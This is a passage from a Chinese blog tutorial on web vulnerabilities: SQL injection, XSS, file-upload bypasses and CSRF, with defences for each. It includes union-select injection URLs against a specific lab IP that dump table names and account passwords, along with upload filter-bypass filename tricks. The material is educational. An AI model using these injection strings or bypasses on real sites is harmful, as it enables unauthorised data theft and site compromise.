+<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;219.153.49.228:48354&#x2F;new_list.php?id&#x3D;-1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema&#x3D;‘mozhe_Discuz_StormGroup’</code></pre></li>
+<li><p>查询指定表名 <code>StormGroup_member</code> 下的列名信息</p>
+<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;219.153.49.228:48354&#x2F;new_list.php?id&#x3D;-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name&#x3D;‘StormGroup_member’</code></pre></li>
+<li><p>查询账号密码</p>
+<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;219.153.49.228:48354&#x2F;new_list.php?id&#x3D;-1 union select 1,name,password,4 StormGroup_member</code></pre></li>
+</ul>
+<h4 id="root-型注入点"><a href="#root-型注入点" class="headerlink" title="root 型注入点"></a>root 型注入点</h4><p>root 用户与普通用户不同，它具有数据库最高权限，可以实现同一 MySQL 服务的<strong>跨数据库</strong>攻击</p>
+<p>换句话说，用户权限的高低，决定了从数据库中获取数据的多少</p>
+<h3 id="如何防御-SQL-注入？"><a href="#如何防御-SQL-注入？" class="headerlink" title="如何防御 SQL 注入？"></a>如何防御 SQL 注入？</h3><h4 id="加入转义字符"><a href="#加入转义字符" class="headerlink" title="加入转义字符"></a>加入转义字符</h4><pre class="language-none"><code class="language-none">SELECT * FROM Users where username&#x3D;&quot;admin\&quot; OR \&quot;\&quot;!&#x3D;\&quot;&quot; AND password&#x3D;&quot;xxxx&quot;</code></pre>
+
+<p> <code>\&quot;</code> 引号经过转义后，只会被当成单纯的一个字符，而不是句子结构的一部分</p>
+<blockquote>
+<p>扩展：</p>
+<p>SQL 语句中，AND 运算符的优先级高于 OR 运算符</p>
+<p>所以执行顺序是</p>
+<p>xxxx OR (xxxx AND xxxx)</p>
+</blockquote>
+<h4 id="预编译-SQL"><a href="#预编译-SQL" class="headerlink" title="预编译 SQL"></a>预编译 SQL</h4><p>在 Java 中，预编译 SQL 通过 PreparedStatement 和占位符 <code>?</code> 来实现</p>
+<p>使用预编译后的 SQL 语句，输入的数据不会再次编译，只会当成参数来处理，比如 <code>AND</code> <code>OR</code> 就不会被处理</p>
+<h2 id="XSS（Cross-Site-Scripting，跨站脚本攻击）"><a href="#XSS（Cross-Site-Scripting，跨站脚本攻击）" class="headerlink" title="XSS（Cross Site Scripting，跨站脚本攻击）"></a>XSS（Cross Site Scripting，跨站脚本攻击）</h2><blockquote>
+<p>目前，网页渲染的方式无非两种：</p>
+<ul>
+<li>前端渲染，即客户端渲染，在前端通过 JavaScript 脚本操作 DOM 节点，动态调整 HTML 网页内容</li>
+<li>后端渲染，即服务端渲染，在后端渲染好 HTML 网页后，返回给浏览器进行显示</li>
+</ul>
+<p>无论采用哪种方式，本质上都是将数据拼接在 HTML 代码中，渲染后呈现给用户</p>
+</blockquote>
+<p>XSS 与 SQL 注入都是典型的<strong>代码注入攻击</strong>，SQL 注入是将恶意代码插入 SQL 语句中，XSS 则是将恶意代码插入 HTML 代码中</p>
+<p>XSS 有三大类：存储型 XSS、反射型 XSS、DOM 型 XSS</p>
+<p>存储型、反射型属于后端漏洞，DOM 型属于前端漏洞</p>
+<p>存储型和反射型的区别：存储型 XSS 的恶意代码存储在目标数据库中，反射型 XSS 的恶意代码是存储在 URL 中</p>
+<h3 id="存储型-XSS"><a href="#存储型-XSS" class="headerlink" title="存储型 XSS"></a>存储型 XSS</h3><ol>
+<li>攻击者将恶意代码提交到目标网站数据库中</li>
+<li>用户打开网站时，服务器将恶意代码从数据库中取出，拼接到 HTML 代码中，并返回给浏览器</li>
+<li>浏览器接收 HTML 网页后解析执行，其中的恶意代码也随之执行</li>
+<li>攻击者窃取用户数据</li>
+</ol>
+<p>存储型 XSS 常见于具有<strong>保存用户数据功能</strong>的网页，如论坛发帖、商品评论、用户私信等</p>
+<h3 id="反射型-XSS"><a href="#反射型-XSS" class="headerlink" title="反射型 XSS"></a>反射型 XSS</h3><ol>
+<li>攻击者构造恶意 URL</li>
+<li>用户打开恶意 URL，网站服务器将恶意代码从 URL 中取出，拼接在 HTML 代码中，并返回给浏览器</li>
+<li>浏览器接收 HTML 代码后解析执行，其中的恶意代码也随之执行</li>
+<li>攻击者窃取用户数据</li>
+</ol>
+<p>反射型 XSS 常见于网页搜索、链接跳转等</p>
+<p>由于需要用户主动打开 URL，攻击者会用多种手段诱导用户点击</p>
+<blockquote>
+<p>POST 提交也可以触发反射型 XSS，但条件比较苛刻（需要构造表单），所以比较少见</p>
+</blockquote>
+<h3 id="DOM-型-XSS"><a href="#DOM-型-XSS" class="headerlink" title="DOM 型 XSS"></a>DOM 型 XSS</h3><ol>
+<li>攻击者构造恶意 URL</li>
+<li>用户打开恶意 URL</li>
+<li>浏览器接收对应 URL 响应后解析执行，前端 JavaScript 取出恶意代码并执行</li>
+<li>攻击者窃取用户数据</li>
+</ol>
+<p>DOM 型 XSS 与前两者类似，只不过 DOM 型是由浏览器取出恶意代码，属于前端 JavaScript 自身的漏洞</p>
+<h3 id="如何防御-XSS？"><a href="#如何防御-XSS？" class="headerlink" title="如何防御 XSS？"></a>如何防御 XSS？</h3><h4 id="防御存储型、反射型"><a href="#防御存储型、反射型" class="headerlink" title="防御存储型、反射型"></a>防御存储型、反射型</h4><p>防御这两种 XSS，有两种办法：</p>
+<ul>
+<li>改为纯前端渲染，当然接下来要考虑防御 DOM 型</li>
+<li>转义 HTML 代码，此时要使用业内成熟的转义库</li>
+</ul>
+<h4 id="防御-DOM-型"><a href="#防御-DOM-型" class="headerlink" title="防御 DOM 型"></a>防御 DOM 型</h4><p>DOM 型实际上是前端代码不够严谨，把用户输入当作代码执行</p>
+<p>核心思想是避免在代码中拼接不可信数据，比如将 <code>innerHTML()</code> 改为 <code>innerText()</code></p>
+<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>网站对文件的上传没有做严格的过滤，导致攻击者可以上传一些恶意文件，从而获取网站权限、窃取用户数据</p>
+<p>恶意文件可以是木马、脚本、病毒等</p>
+<blockquote>
+<p>注意区别后台权限、网站权限</p>
+</blockquote>
+<h3 id="文件类型绕过"><a href="#文件类型绕过" class="headerlink" title="文件类型绕过"></a>文件类型绕过</h3><p>网站仅在前端检测上传文件的类型，这样可以通过抓包，然后修改请求内容进行绕过</p>
+<h3 id="文件头绕过"><a href="#文件头绕过" class="headerlink" title="文件头绕过"></a>文件头绕过</h3><p>网站使用文件头字节来检测文件类型，这样可以在文件头加入对应的字节来绕过</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Rayucan/imageCloud/data/202303021700007.png" alt="image-20230302170001705" loading="lazy"></p>
+<h3 id="文件后缀绕过"><a href="#文件后缀绕过" class="headerlink" title="文件后缀绕过"></a>文件后缀绕过</h3><p>在 Windows 系统中，上传 <code>index.php.</code> 会被重命名为  <code>.</code></p>
+<p>也可以尝试  <code>index.php%20</code> <code>index.php:1.jpg</code> 等</p>
+<h3 id="如何查找和判断文件上传漏洞？"><a href="#如何查找和判断文件上传漏洞？" class="headerlink" title="如何查找和判断文件上传漏洞？"></a>如何查找和判断文件上传漏洞？</h3><h4 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h4><p>黑盒测试，即<strong>不知道网站源码</strong>的情况下进行漏洞分析</p>
+<p>使用扫描工具，扫描网站，找到上传入口</p>
+<h4 id="白盒测试"><a href="#白盒测试" class="headerlink" title="白盒测试"></a>白盒测试</h4><p>直接分析源代码</p>
+<h2 id="CSRF（Cross-Site-Request-Forgery，跨站请求伪造）"><a href="#CSRF（Cross-Site-Request-Forgery，跨站请求伪造）" class="headerlink" title="CSRF（Cross Site Request Forgery，跨站请求伪造）"></a>CSRF（Cross Site Request Forgery，跨站请求伪造）</h2><p>HTTP 协议是无状态的，需要通过 Cookie 等手段将用户信息保存在浏览器中，当发起 HTTP 请求后，浏览器自动携带 Cookie 进行认证</p>
+<p>利用这一点，攻击者可以诱导用户在 Cookie 已认证的情况下，执行恶意操作</p>
+<p>比如，用户已登录一个网上银行账户，攻击者诱导用户点击一张图片，其中含有转账 URL，一旦用户点击，就会在不知情的情况下向攻击者转账，触发 CSRF 攻击</p>
+<p>CSRF 攻击可以分为 <strong>GET 型和 POST 型</strong></p>
+<p>上述例子中，转账是 GET 请求发出的，但是 POST 请求也未必安全</p>
+<p>虽然 POST 请求无法通过链接触发，但可以通过表单提交触发</p>
+<h3 id="如何防御-CSRF-攻击？"><a href="#如何防御-CSRF-攻击？" class="headerlink" title="如何防御 CSRF 攻击？"></a>如何防御 CSRF 攻击？</h3><p>CSRF 攻击的一个特点是，虽然攻击者可以冒充用户携带 Cookie 进行认证，但是无法知道具体的 Cookie 内容</p>
+<p>那么就可以要求用户每次提交请求都要携带一个特殊的 Token，服务器通过校验 Token 来区分正常的请求和 CSRF 攻击</p>
+<h4 id="令牌校验"><a href="#令牌校验" class="headerlink" title="令牌校验"></a>令牌校验</h4><p>每次用户打开网页，服务器给用户发送一个 Token，且该 Token 经过了加密，并保存在服务器 Session 中</p>
+<p>对于 GET 请求，浏览器将 Token 作为参数附加在 URL 链接之后</p>
+<p>对于 POST 请求，浏览器将 Token 附加在表单参数中</p>
+<h4 id="验证码校验"><a href="#验证码校验" class="headerlink" title="验证码校验"></a>验证码校验</h4><p>加入手机验证码校验，每次提交请求，就要求用户提供手机验证码，这样可以彻底防止 CSRF 攻击</p>
+</div><ul class="post-copyright"><li class="post-copyright-author"><strong>Post author: </strong>Rayucan</li><li class="post-copyright-link"><strong>Post link: </strong><a href="http://example.com/2023/02/26/web%E6%BC%8F%E6%B4%9E/" title="web漏洞">http://example.com/2023/02/26/web%E6%BC%8F%E6%B4%9E/</a></li><li class="post-copyright-license"><strong>Copyright Notice: </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><svg class="icon"><use xlink:href="#icon-creative-commons-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-by-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-nc-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-sa-line"></use></svg></a> unless otherwise stated.</li></ul></section></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2023/03/03/cpp/" rel="prev" title="c++"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-left-s-line"></use></svg><span class="post-nav-text">c++</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2023/02/23/Log4j%E6%BC%8F%E6%B4%9E/" rel="next" title="Log4j漏洞"><span class="post-nav-text">Log4j漏洞</span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-right-s-line"></use></svg></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>要不要和我说些什么？</span><br></div></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2020 – 2023 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> Rayucan</span></div><div class="powered"><span>Powered by <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> v5.4.0</span><span class="footer-separator">|</span><span>Theme - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.6.1</span></div></footer><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a></div></body></html>
